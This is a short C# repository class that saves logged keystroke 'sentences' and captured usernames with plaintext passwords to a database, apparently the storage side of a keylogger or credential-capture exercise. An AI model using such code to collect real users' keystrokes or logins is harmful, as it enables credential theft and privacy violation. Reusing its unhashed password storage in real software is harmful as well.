using M183.DataAccess;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace M183.BusinessLogic
{
    public class Repository
    {
        private static DatabaseContext db = new DatabaseContext();

        public void SaveKeyLog(string sentence)
        {
            db.LoggedText.Add(new LoggedText()
            {
                Sentence = sentence,
                Timestamp = DateTime.Now,
            });
            db.SaveChanges();
        }

        public void SaveAccountLog(string username, string password)
        {
            db.LoggedAccount.Add(new LoggedAccount()
            {
                Timestamp = DateTime.Now,
                Username = username,
                Password = password,
            });
            db.SaveChanges();
        }
    }
}
